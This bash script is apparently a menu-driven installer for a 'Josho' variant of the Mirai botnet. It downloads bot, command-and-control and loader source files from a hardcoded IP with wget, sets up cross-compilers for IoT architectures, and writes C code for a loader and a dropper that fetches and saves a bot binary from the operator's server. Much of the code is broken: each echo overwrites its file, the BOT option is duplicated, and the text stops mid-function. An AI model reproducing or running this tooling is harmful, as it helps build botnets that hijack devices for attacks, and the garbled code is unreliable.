#!/bin/bash
BLACK='\e[0;30m'
BLUE='\e[0;34m'
GREEN='\e[0;32m'
CYAN='\e[0;36m'
RED='\e[0;31m'
PURPLE='\e[0;35m'
BROWN='\e[0;33m'
LIGHTGRAY='\e[0;37m'
DARKGRAY='\e[1;30m'
LIGHTBLUE='\e[1;34m'
LIGHTGREEN='\e[1;32m'
LIGHTCYAN='\e[1;36m'
LIGHTRED='\e[1;31m'
LIGHTPURPLE='\e[1;35m'
YELLOW='\e[1;33m'
ULG='\e[4;1;32m'
WHITE='\e[1;37m'
NC='\e[0m'
clear
tput civis
who am i >> logs.txt
echo -n -e "${WHITE}Booting Up Menu.. \r"
sleep 1.5
echo -n -e "${WHITE}Loading Menu [${RED}##                       ${WHITE}(8%)\r"
sleep 1
echo -n -e "${WHITE}Loading Menu [${RED}########                 ${WHITE}(38%)\r"
sleep 1
echo -n -e "${WHITE}Loading Menu [${RED}##########               ${WHITE}(49%)\r"
sleep 1
echo -n -e "${WHITE}Loading Menu [${RED}################         ${WHITE}(80%)\r"
sleep 1
echo -n -e "${WHITE}Loading Menu [${RED}#######################${WHITE}] (100%) ${RED}Finished"
sleep 2
echo -ne '\n'
tput cnorm
while true
do
clear
echo -e "
     ${RED}███${WHITE}╗   ${RED}███${WHITE}╗${RED}██${WHITE}╗${RED}██████${WHITE}╗  ${RED}█████${WHITE}╗ ${RED}██${WHITE}╗${RED}███████${WHITE}╗${RED}███████${WHITE}╗${RED}████████${WHITE}╗${RED}██${WHITE}╗   ${RED}██${WHITE}╗${RED}██████${WHITE}╗ 
     ${RED}████${WHITE}╗ ${RED}████${WHITE}║${RED}██${WHITE}║${RED}██${WHITE}╔══${RED}██${WHITE}╗${RED}██${WHITE}╔══${RED}██${WHITE}╗${RED}██${WHITE}║${RED}██${WHITE}╔════╝${RED}██${WHITE}╔════╝╚══${RED}██${WHITE}╔══╝${RED}██${WHITE}║   ${RED}██${WHITE}║${RED}██${WHITE}╔══${RED}██${WHITE}╗
     ${RED}██${WHITE}╔${RED}████${WHITE}╔${RED}██${WHITE}║${RED}██${WHITE}║${RED}██████${WHITE}╔╝${RED}███████${WHITE}║${RED}██${WHITE}║${RED}███████${WHITE}╗${RED}█████${WHITE}╗     ${RED}██${WHITE}║   ${RED}██${WHITE}║   ${RED}██${WHITE}║${RED}██████${WHITE}╔╝
     ${RED}██${WHITE}║╚${RED}██${WHITE}╔╝${RED}██${WHITE}║${RED}██${WHITE}║${RED}██${WHITE}╔══${RED}██${WHITE}╗${RED}██${WHITE}╔══${RED}██${WHITE}║${RED}██${WHITE}║╚════${RED}██║${RED}██${WHITE}╔══╝     ${RED}██${WHITE}║   ${RED}██${WHITE}║   ${RED}██${WHITE}║${RED}██${WHITE}╔═══╝ 
     ${RED}██${WHITE}║ ╚═╝ ${RED}██${WHITE}║${RED}██${WHITE}║${RED}██${WHITE}║  ${RED}██${WHITE}║${RED}██${WHITE}║  ${RED}██${WHITE}║${RED}██${WHITE}║${RED}███████${WHITE}║${RED}███████${WHITE}╗   ${RED}██${WHITE}║   ╚${RED}██████${WHITE}╔╝${RED}██${WHITE}║     
     ${WHITE}╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝ 
"
echo -e "${WHITE}Devs:${WHITE} [${LIGHTCYAN}@FlexingOnLamers${WHITE}]"
echo -e "${LIGHTBLUE}list ${WHITE}To See The Full List OF Commands "
echo -e "\n"
echo -e ""
echo -e ""
echo -e ""
echo -e ""
echo -e -n "${WHITE}root@${LIGHTRED}MIRAI${WHITE} ~]# \c"
read answer
if [[ $answer == list ]]
then
clear
echo -e ""
echo -e "${RED}                                 [${WHITE}+${RED}]${LIGHTCYAN}Commands${RED}[${WHITE}+${RED}]                                "
echo -e ""
echo -e "${LIGHTCYAN}--------------------------------------------------------------------------------"
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}AWS               ${WHITE}Downloads All Updates Needed for creating the Mirai (step1)  "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}Cross             ${WHITE}Downloads all Cross Compilers and sets up golang (step2)  "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}BOT               ${WHITE}Replaces All IPS with your server IP includes.h (/bot/) (step3)  "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}SRC               ${WHITE}Replaces All IPS with your server IP Main.c (loader/src/) (step4)  "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}DLR               ${WHITE}Replaces All IPS with your server IP Main.c (/dlr/) (step5)  "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}SQL1              ${WHITE}Sets Up MYSQL and userset password (step6)  "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}SQL2              ${WHITE}Sets Up Tables and Database (josho) (step7)  "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}PASS              ${WHITE}Puts MYSQL password in the main.go (cnc) (step7)  "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}START             ${WHITE}Compiles Your Mirai and starts it (step7)  "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}Type: ${LIGHTCYAN}FINISH            ${WHITE}starts CNC and SCANLISTEN finishing your mirai (step7)  "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}This took me like 2 - 3 hours to make, hope you enjoy :/ "
echo -e "${LIGHTRED}[${WHITE}+${LIGHTRED}] ${WHITE}When finished, Login: root root, Port:954  "
echo -e "${LIGHTCYAN}--------------------------------------------------------------------------------"
read
fi
if [[ $answer == AWS ]]
then
clear
echo -e "${LIGHTRED}Updating System.."
echo -e ""
yum update -y
echo -e "${LIGHTCYAN}Finished Updating.."
echo -e "${LIGHTGREEN}Now installing Needed dependencies.."
yum install epel-release -y

yum groupinstall "Development Tools" -y

yum install gmp-devel -y

ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10

yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
service mysqld stop
service mysqld start
service mysqld restart
 
echo -e "${LIGHTCYAN}Finished installing.."
sleep 1.0
echo -e "${LIGHTRED}Now installing Josho v1 Net files.."
sleep 1.0
echo -e ""
wget -q http://74.91.115.32/mirai/build.sh -O build.sh
wget -q http://74.91.115.32/mirai/build_payload.py -O build_payload.py
wget -q http://74.91.115.32/mirai/enc.c -O enc.c
wget -q http://74.91.115.32/mirai/scanListen.go -O scanListen.go
wget -q http://74.91.115.32/mirai/sql.sh -O sql.sh

echo -e "${LIGHTRED}Making Directory (bot).."
sleep 1.0
echo -e "${LIGHTRED}Downloading Bot Files.."
sleep 1.0
echo -e ""
mkdir bot
cd bot
wget -q http://74.91.115.32/mirai/bot/attack.c -O attack.c
wget -q http://74.91.115.32/mirai/bot/attack_method.c -O attack_method.c
wget -q http://74.91.115.32/mirai/bot/attack.h -O attack.h
wget -q http://74.91.115.32/mirai/bot/checksum.h -O checksum.h
wget -q http://74.91.115.32/mirai/bot/checksum.c -O checksum.c
wget -q http://74.91.115.32/mirai/bot/includes.h -O includes.h
wget -q http://74.91.115.32/mirai/bot/desktop.ini -O desktop.ini
wget -q http://74.91.115.32/mirai/bot/killer.c -O killer.c
wget -q http://74.91.115.32/mirai/bot/killer.h -O killer.h
wget -q http://74.91.115.32/mirai/bot/main.c -O main.c
wget -q http://74.91.115.32/mirai/bot/protocol.h -O protocol.h
wget -q http://74.91.115.32/mirai/bot/rand.c -O rand.c
wget -q http://74.91.115.32/mirai/bot/rand.h -O rand.h
wget -q http://74.91.115.32/mirai/bot/resolv.c -O resolv.c
wget -q http://74.91.115.32/mirai/bot/resolv.h -O resolv.h
wget -q http://74.91.115.32/mirai/bot/scanner.c -O scanner.c
wget -q http://74.91.115.32/mirai/bot/scanner.h -O scanner.h
wget -q http://74.91.115.32/mirai/bot/table.c -O table.c
wget -q http://74.91.115.32/mirai/bot/util.c -O util.c
wget -q http://74.91.115.32/mirai/bot/table.h -O table.h
wget -q http://74.91.115.32/mirai/bot/util.h -O util.h

cd
echo -e "${LIGHTCYAN}Finished installing Bot Files.."
sleep 1.0
echo -e "${LIGHTRED}Now Creating CNC folder and installing cnc files.."
sleep 1.0
echo -e ""
mkdir cnc
cd cnc
wget -q http://74.91.115.32/mirai/cnc/admin.go -O admin.go
wget -q http://74.91.115.32/mirai/cnc/attack.go -O attack.go
wget -q http://74.91.115.32/mirai/cnc/clientList.go -O clientList.go
wget -q http://74.91.115.32/mirai/cnc/bot.go -O bot.go
wget -q http://74.91.115.32/mirai/cnc/main.go -O main.go
wget -q http://74.91.115.32/mirai/cnc/database.go -O database.go

cd
echo -e "${LIGHTCYAN}Finished installing cnc Files.."
sleep 1.0
echo -e "${LIGHTRED}Now Creating dlr folder and installing dlr files.."
sleep 1.0
echo -e ""
mkdir dlr
cd dlr
wget -q http://74.91.115.32/mirai/dlr/main.c -O main.c
mkdir release
cd
echo -e "${LIGHTCYAN}Finished!"
sleep 1.0
echo -e "${LIGHTCYAN}Finished installing dlr Files.."
sleep 1.0
echo -e "${LIGHTRED}Now Creating loader folder"
sleep 1.0
echo -e ""
mkdir loader
cd loader
echo -e "${LIGHTCYAN}Finished!"
sleep 1.0
echo -e "${LIGHTRED}Now Creating bins folder and src folder"
sleep 1.0
echo -e "${LIGHTCYAN}Finished!"
sleep 1.0
echo -e "" 
mkdir bins
mkdir src
cd src
wget -q http://74.91.115.32/mirai/loader/src/binary.c -O binary.c
wget -q http://74.91.115.32/mirai/loader/src/connection.c -O connection.c
wget -q http://74.91.115.32/mirai/loader/src/main.c -O main.c
wget -q http://74.91.115.32/mirai/loader/src/server.c -O server.c
wget -q http://74.91.115.32/mirai/loader/src/telnet_info.c -O telnet_info.c
wget -q http://74.91.115.32/mirai/loader/src/util.c -O util.c
mkdir headers
cd headers
wget -q http://74.91.115.32/mirai/loader/src/headers/binary.h -O binary.h
wget -q http://74.91.115.32/mirai/loader/src/headers/connection.h -O connection.h
wget -q http://74.91.115.32/mirai/loader/src/headers/includes.h -O includes.h
wget -q http://74.91.115.32/mirai/loader/src/headers/server.h -O server.h
wget -q http://74.91.115.32/mirai/loader/src/headers/telnet_info.h -O telnet_info.h
wget -q http://74.91.115.32/mirai/loader/src/headers/util.h -O util.h
cd
cd
read
fi
if [[ $answer == Cross ]]
then
clear
echo -e "${LIGHTRED}Now Installing Compilers and Setting up golang.."
sleep 1.0
echo -e ""
mkdir /etc/xcompile
cd /etc/xcompile
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2
rm -rf *.tar.bz2
mv cross-compiler-i586 i586
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l
cd /tmp
wget https://storage.googleapis.com/golang/go1.8.3.linux-amd64.tar.gz -q
tar -xzf go1.8.3.linux-amd64.tar.gz
mv go /usr/local
cd ~/
echo -e "${LIGHTCYAN}Finished installing.."
echo -e "${LIGHTRED}Now going back to menu.."
read 
fi
if [[ $answer == BOT ]]
then
clear
echo -e ""
echo -e "${WHITE} Enter Your Server IP:${LIGHTRED} \c"
read IP
clear
echo -e ""
echo -e "${WHITE} Enter Your Domain If not using one enter IP:${LIGHTRED} \c"
read DOMAIN
clear
echo -e ""
echo -e "${WHITE} Enter The Beginning Numbers of your server IP EX:(185).255.15.100:${LIGHTRED} \c"
read first
clear
echo -e ""
echo -e "${WHITE} Enter The Second selection of Numbers of your server IP EX:185.(255).15.100:${LIGHTRED} \c"
read second
clear
echo -e ""
echo -e "${WHITE} Enter The third selection of Numbers of your server IP EX:185.255.(15).100:${LIGHTRED} \c"
read third
clear
echo -e ""
echo -e "${WHITE} Enter The Fourth selection of Numbers of your server IP EX:185.255.15.(100):${LIGHTRED} \c"
read fourth
clear
echo -e ""
cd /bot/
rm -rf includes.h
echo -e "#pragma once" > includes.h
echo -e " " > includes.h
echo -e "#include <unistd.h>" > includes.h
echo -e "#include <stdint.h>" > includes.h
echo -e "#include <stdarg.h>" > includes.h
echo -e "  " > includes.h
echo -e "#define STDIN 0" > includes.h
echo -e "#define STDOUT 1" > includes.h
echo -e "#define STDERR 2" > includes.h
echo -e " " > includes.h
echo -e "#define FALSE 0" > includes.h
echo -e "#define TRUE 1" > includes.h
echo -e " " > includes.h
echo -e "typedef char BOOL;" > includes.h
echo -e " " > includes.h
echo -e "typedef uint32_t ipv4_t;" > includes.h
echo -e "typedef uint16_t port_t;" > includes.h
echo -e " " > includes.h
echo -e "#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))" > includes.h
echo -e " " > includes.h
echo -e "#define FAKE_CNC_ADDR INET_ADDR($first,$second,$third,$fourth)" > includes.h
echo -e "#define FAKE_CNC_PORT 23" > includes.h
echo -e "/*                                                                 */" > includes.h
echo -e "#ifndef USEDOMAIN" > includes.h
echo -e "#define SCANIP (int)inet_addr((const char*)"$IP");" > includes.h
echo -e "#define SERVIP (int)inet_addr((const char*)"$IP");" > includes.h
echo -e " " > includes.h
echo -e "#else" > includes.h
echo -e " " > includes.h
echo -e "#define SCANDOM "$DOMAIN" " > includes.h
echo -e "#define SERVDOM "$DOMAIN" " > includes.h
echo -e "#define SCANIP (int)inet_addr((const char*)"$IP");" > includes.h
echo -e "#define SERVIP (int)inet_addr((const char*)"$IP");" > includes.h
echo -e " " > includes.h
echo -e "#endif" > includes.h
echo -e "/*                                                                 */" > includes.h
echo -e "ipv4_t LOCAL_ADDR;" > includes.h
cd
cd

read 
fi
if [[ $answer == SRC ]]
then
clear
echo -e ""
echo -e "${WHITE} Enter Your Server IP:${LIGHTRED} \c"
read IP
clear
echo -e ""
echo -e "${WHITE} Enter The IP you want to Bind your server with:${LIGHTRED} \c"
read BINDIP
clear
echo -e ""
cd
cd /loader/src/
rm -rf main.c
echo -e "#include <stdio.h>" > main.c
echo -e "#include <stdlib.h>" > main.c
echo -e "#include <unistd.h>" > main.c
echo -e "#include <string.h>" > main.c
echo -e "#include <unistd.h>" > main.c
echo -e "#include <pthread.h>" > main.c
echo -e "#include <sys/socket.h>" > main.c
echo -e "#include <errno.h>" > main.c
echo -e "#include <headers/includes.h> " > main.c
echo -e "#include <headers/server.h> " > main.c
echo -e "#include <headers/telnet_info.h> " > main.c
echo -e "#include <headers/binary.h> " > main.c
echo -e "#include <headers/util.h> " > main.c
echo -e " " > main.c
echo -e "static void *stats_thread(void *);" > main.c
echo -e " " > main.c
echo -e "static struct server *srv;" > main.c
echo -e " " > main.c
echo -e "char *id_tag = "selfrep";" > main.c
echo -e " " > main.c
echo -e "int main(int argc, char **args)" > main.c
echo -e "{" > main.c
echo -e "    pthread_t stats_thrd;" > main.c
echo -e "    uint8_t addrs_len;" > main.c
echo -e "    ipv4_t *addrs;" > main.c
echo -e "    uint32_t total = 0;" > main.c
echo -e "    struct telnet_info info;" > main.c
echo -e " " > main.c
echo -e "    addrs_len = 2;" > main.c
echo -e "    addrs = calloc(addrs_len, sizeof (ipv4_t));"  > main.c
echo -e "    addrs[0] = inet_addr("$IP"); // $IP"  > main.c
echo -e "    addrs[1] = inet_addr("$BINDIP"); // Address to bind to"  > main.c
echo -e "    if (argc == 2)"  > main.c
echo -e "    {"  > main.c
echo -e "        id_tag = args[1];"  > main.c
echo -e "    }"  > main.c
echo -e " "  > main.c
echo -e "    if (!binary_init())"  > main.c
echo -e "    {" main.c
echo -e "        printf("Failed to load bins/dlr.* as dropper\n");"  > main.c
echo -e "        return 1;"  > main.c
echo -e "    }"  > main.c
echo -e "    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "$IP", 80, "$IP")) == NULL) " > main.c
echo -e "    {" > main.c
echo -e "        printf("Failed to initialize server. Aborting\n");" > main.c
echo -e "        return 1;" > main.c
echo -e "    }" > main.c
echo -e "    pthread_create(&stats_thrd, NULL, stats_thread, NULL);" > main.c
echo -e "    // Read from stdin" > main.c
echo -e "    while (TRUE)" > main.c
echo -e "    {" > main.c
echo -e "        char strbuf[1024];" > main.c
echo -e " " > main.c
echo -e "        if (fgets(strbuf, sizeof (strbuf), stdin) == NULL)" > main.c
echo -e "            break;" > main.c
echo -e " " > main.c
echo -e "        util_trim(strbuf);" > main.c
echo -e " " > main.c
echo -e "        if (strlen(strbuf) == 0)" > main.c
echo -e "        {" > main.c
echo -e "            usleep(10000);" > main.c
echo -e "            continue;" > main.c
echo -e "        }" > main.c
echo -e " " > main.c
echo -e "        memset(&info, 0, sizeof(struct telnet_info));" > main.c
echo -e "        if (telnet_info_parse(strbuf, &info) == NULL)" > main.c
echo -e "            printf(""); " > main.c
echo -e "        else" > main.c
echo -e "        {" > main.c
echo -e "            if (srv == NULL)" > main.c
echo -e "                printf("srv == NULL 2\n");" > main.c
echo -e " " > main.c
echo -e "            server_queue_telnet(srv, &info);" > main.c
echo -e "            if (total++ % 1000 == 0)" > main.c
echo -e "                sleep(1);" > main.c
echo -e "        }" > main.c
echo -e " " > main.c
echo -e "        ATOMIC_INC(&srv->total_input);" > main.c
echo -e "    }" > main.c
echo -e " " > main.c
echo -e "    printf("Hit end of input.\n");" > main.c
echo -e " " > main.c
echo -e "    while(ATOMIC_GET(&srv->curr_open) > 0)" > main.c
echo -e "        sleep(1);" > main.c
echo -e " " > main.c
echo -e "    return 0;" > main.c
echo -e "}" > main.c
echo -e " " > main.c
echo -e "static void *stats_thread(void *arg)" > main.c
echo -e "{" > main.c
echo -e "    uint32_t seconds = 0;" > main.c
echo -e " " > main.c
echo -e "    while (TRUE)" > main.c
echo -e "    {" > main.c
echo -e "#ifndef DEBUG" > main.c
echo -e "        printf("Time: [%ds] || Conns: [%d] || Logins: [%d] || Ran: [%d] || Echoes: [%d] || Wgets: [%d] || TFTPs: [%d]\n"," > main.c
echo -e "               seconds++, ATOMIC_GET(&srv->curr_open), ATOMIC_GET(&srv->total_logins), ATOMIC_GET(&srv->total_successes)," > main.c
echo -e "               ATOMIC_GET(&srv->total_echoes), ATOMIC_GET(&srv->total_wgets), ATOMIC_GET(&srv->total_tftps));" > main.c
echo -e "#endif" > main.c
echo -e "        fflush(stdout);" > main.c
echo -e "        sleep(1);" > main.c
echo -e "    }" > main.c
echo -e "}" > main.c
echo -e ""
cd
cd
read 
fi
if [[ $answer == BOT ]]
then
clear
echo -e ""
echo -e "${WHITE} Enter Your Server IP (Again):${LIGHTRED} \c"
read IP
clear
echo -e ""
echo -e "${WHITE} Enter The Beginning Numbers of your server IP EX:(185).255.15.100:${LIGHTRED} \c"
read first
clear
echo -e ""
echo -e "${WHITE} Enter The Second selection of Numbers of your server IP EX:185.(255).15.100:${LIGHTRED} \c"
read second
clear
echo -e "${WHITE} Enter The third selection of Numbers of your server IP EX:185.255.(15).100:${LIGHTRED} \c"
read third
clear
echo -e "${WHITE} Enter The Fourth selection of Numbers of your server IP EX:185.255.15.(100):${LIGHTRED} \c"
read fourth
clear
echo -e ""

cd
cd /dlr/
rm -rf main.c

echo -e "#include <sys/types.h>" > main.c
echo -e "//#include <bits/syscalls.h>" > main.c
echo -e "#include <sys/syscall.h>" > main.c
echo -e "#include <fcntl.h>" > main.c
echo -e "#include <sys/socket.h>" > main.c
echo -e "#include <netinet/in.h>" > main.c
echo -e " " > main.c
echo -e "#define HTTP_SERVER utils_inet_addr($first,$second,$third,$fourth) // $IP" > main.c
echo -e " " > main.c
echo -e "#define EXEC_MSG            "NIGGY\n"" > main.c
echo -e "#define EXEC_MSG_LEN        6" > main.c
echo -e " " > main.c
echo -e "#define DOWNLOAD_MSG        "RAY\n"" > main.c
echo -e "#define DOWNLOAD_MSG_LEN    4" > main.c
echo -e " " > main.c
echo -e "#define STDIN   0" > main.c
echo -e "#define STDOUT  1" > main.c
echo -e "#define STDERR  2" > main.c
echo -e " " > main.c
echo -e "#if BYTE_ORDER == BIG_ENDIAN" > main.c
echo -e "#define HTONS(n) (n)" > main.c
echo -e "#define HTONL(n) (n)" > main.c
echo -e "#elif BYTE_ORDER == LITTLE_ENDIAN" > main.c
echo -e "#define HTONS(n) (((((unsigned short)(n) & 0xff)) << 8) | (((unsigned short)(n) & 0xff00) >> 8))" > main.c
echo -e "#define HTONL(n) (((((unsigned long)(n) & 0xff)) << 24) | \ " > main.c
echo -e "                  ((((unsigned long)(n) & 0xff00)) << 8) | \ " > main.c
echo -e "                  ((((unsigned long)(n) & 0xff0000)) >> 8) | \ " > main.c
echo -e "                  ((((unsigned long)(n) & 0xff000000)) >> 24))" > main.c
echo -e "#else" > main.c
echo -e "#error "Fix byteorder"" > main.c
echo -e "#endif" > main.c
echo -e " " > main.c
echo -e "#ifdef __ARM_EABI__" > main.c
echo -e "#define SCN(n) ((n) & 0xfffff)" > main.c
echo -e "#else" > main.c
echo -e "#define SCN(n) (n)" > main.c
echo -e "#endif" > main.c
echo -e " " > main.c
echo -e "inline void run(void);" > main.c
echo -e "int sstrlen(char *);" > main.c
echo -e "unsigned int utils_inet_addr(unsigned char, unsigned char, unsigned char, unsigned char);" > main.c
echo -e " " > main.c
echo -e "/* stdlib calls */" > main.c
echo -e "int xsocket(int, int, int);" > main.c
echo -e "int xwrite(int, void *, int);" > main.c
echo -e "int xread(int, void *, int);" > main.c
echo -e "int xconnect(int, struct sockaddr_in *, int);" > main.c
echo -e "int xopen(char *, int, int);" > main.c
echo -e "int xclose(int);" > main.c
echo -e "void x__exit(int);" > main.c
echo -e " " > main.c
echo -e "#define socket xsocket" > main.c
echo -e "#define write xwrite" > main.c
echo -e "#define read xread" > main.c
echo -e "#define connect xconnect" > main.c
echo -e "#define open xopen" > main.c
echo -e "#define close xclose" > main.c
echo -e "#define __exit x__exit" > main.c
echo -e " " > main.c
echo -e "void __start(void)" > main.c
echo -e "{ " > main.c
echo -e "#if defined(MIPS) || defined(MIPSEL)" > main.c
echo -e "    __asm(" > main.c
echo -e "        ".set noreorder\n"" > main.c
echo -e "        "move $0, $31\n"" > main.c
echo -e "        "bal 10f\n"" > main.c
echo -e "        "nop\n"" > main.c
echo -e "        "10:\n.cpload $31\n"" > main.c
echo -e "        "move $31, $0\n"" > main.c
echo -e "        ".set reorder\n"" > main.c
echo -e "    );" > main.c
echo -e "#endif" > main.c
echo -e "    run();" > main.c
echo -e "}" > main.c
echo -e " " > main.c
echo -e "inline void run(void)" > main.c
echo -e "{" > main.c
echo -e "    char recvbuf[128];" > main.c
echo -e "    struct sockaddr_in addr;" > main.c
echo -e "    int sfd, ffd, ret;" > main.c
echo -e "    unsigned int header_parser = 0; " > main.c
echo -e "    int arch_strlen = sstrlen(BOT_ARCH); " > main.c
echo -e " " > main.c
echo -e "    write(STDOUT, EXEC_MSG, EXEC_MSG_LEN); " > main.c
echo -e " " > main.c
echo -e "    addr.sin_family = AF_INET; " > main.c
echo -e "    addr.sin_port = HTONS(80); " > main.c
echo -e "    addr.sin_addr.s_addr = HTTP_SERVER; " > main.c
echo -e " " > main.c
echo -e "    ffd = open("AbAd", O_WRONLY | O_CREAT | O_TRUNC, 0777); " > main.c
echo -e " " > main.c
echo -e "    sfd = socket(AF_INET, SOCK_STREAM, 0); " > main.c
echo -e " " > main.c
echo -e "#ifdef DEBUG" > main.c
echo -e "    if (ffd == -1)" > main.c
echo -e "        printf("Failed to open file!\n"); " > main.c
echo -e "    if (sfd == -1)" > main.c
echo -e '        printf("Failed to call socket()\n");' > main.c
echo -e "#endif" > main.c
echo -e " " > main.c
echo -e "    if (sfd == -1 || ffd == -1)" > main.c
echo -e "        __exit(1);" > main.c
echo -e " " > main.c
echo -e "#ifdef DEBUG" > main.c
echo -e "    printf("Connecting to host...\n");" > main.c
echo -e "#endif" > main.c
echo -e " " > main.c
echo -e "    if ((ret = connect(sfd, &addr, sizeof (struct sockaddr_in))) < 0)" > main.c
echo -e "    {" > main.c
echo -e "#ifdef DEBUG" > main.c
echo -e "        printf("Failed to connect to host.\n");" > main.c
echo -e "#endif" > main.c
echo -e "        write(STDOUT, "YAR\n", 4);" > main.c
echo -e "        __exit(-ret);" > main.c
echo -e "    }" > main.c
echo -e " " > main.c
echo -e "#ifdef DEBUG" > main.c
echo -e "    printf("Connected to host\n");" > main.c
echo -e "#endif" > main.c
echo -e " " > main.c
echo -e "    if (write(sfd, "GET /AB4g5/Josho." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (19 + arch_strlen + 13))" > main.c
echo -e "    {" > main.c
echo -e "#ifdef DEBUG" > main.c
echo -e "        printf("Failed to send get request.\n");" > main.c
echo -e "#endif" > main.c
echo -e " " > main.c
echo -e "        __exit(3);" > main.c
echo -e "    }" > main.c
echo -e " " > main.c
echo -e "#ifdef DEBUG" > main.c
echo -e "    printf("Started header parse...\n");" > main.c
echo -e "#endif" > main.c
echo -e " " > main.c
echo -e "    while (header_parser != 0x0d0a0d0a)" > main.c
echo -e "    {" > main.c
echo -e "        char ch;" > main.c
echo -e "        int ret = read(sfd, &ch, 1);" > main.c
echo -e " " > main.c
echo -e "        if (ret != 1)" > main.c
echo -e "            __exit(4);" > main.c
echo -e "        header_parser = (header_parser << 8) | ch;" > main.c
echo -e "    }" > main.c
echo -e " " > main.c
echo -e "#ifdef DEBUG" > main.c
echo -e "    printf("Finished receiving HTTP header\n");" > main.c
echo -e "#endif" > main.c
echo -e " " > main.c
echo -e "    while (1)" > main.c
echo -e "    {" > main.c
echo -e "        int ret = read(sfd, recvbuf, sizeof (recvbuf));" > main.c
echo -e " " > main.c
echo -e "        if (ret <= 0)" > main.c
echo -e "            break;" > main.c
echo -e "        write(ffd, recvbuf, ret);" > main.c
echo -e "    }" > main.c
echo -e " " > main.c
echo -e "    close(sfd);" > main.c
echo -e "    close(ffd);" > main.c
echo -e "    write(STDOUT, DOWNLOAD_MSG, DOWNLOAD_MSG_LEN);" > main.c
echo -e "    __exit(5);" > main.c
echo -e "}" > main.c
echo -e " " > main.c
echo -e "int sstrlen(char *str)" > main.c
echo -e "{" > main.c
echo -e "    int c = 0;" > main.c
echo -e " " > main.c
echo -e "    while (*str++ != 0)" > main.c
echo -e "        c++;" > main.c
echo -e "    return c;" > main.c
echo -e "}" > main.c
echo -e " " > main.c
echo -e "unsigned int utils_inet_addr(unsigned char one, unsigned char two, unsigned char three, unsigned char four)" > main.c
echo -e "{" > main.c
echo -e "    unsigned long ip = 0;" > main.c
echo -e " " > main.c
echo -e "    ip |= (one << 24);" > main.c
echo -e "    ip |= (two << 16);" > main.c
echo -e "    ip |= (three << 8);" > main.c
echo -e "    ip |= (four << 0);" > main.c
echo -e "    return HTONL(ip);" > main.c
echo -e "}" > main.c
echo -e " " > main.c
echo -e "int xsocket(int domain, int type, int protocol)" > main.c
echo -e "{" > main.c
echo -e "#if defined(__NR_socketcall)" > main.c
echo -e "#ifdef DEBUG" > main.c
echo -e "    printf("socket using socketcall\n");" > main.c
echo -e "#endif" > main.c
echo -e "    struct {" > main.c
echo -e "        int domain, type, protocol;" > main.c
echo -e "    } socketcall;" > main.c
echo -e "    socketcall.domain = domain;" > main.c
echo -e "    socketcall.type = type;" > main.c
echo -e "    socketcall.protocol = protocol;" > main.c
echo -e " " > main.c
echo -e "    // 1 == SYS_SOCKET" > main.c
echo -e "    int ret = syscall(SCN(SYS_socketcall), 1, &socketcall);" > main.c
echo -e " " > main.c
echo -e "#ifdef DEBUG" > main.c
echo -e "    printf("socket got ret: %d\n", ret);" > main.c
echo -e "#endif" > main.c
echo -e "     return ret;" > main.c
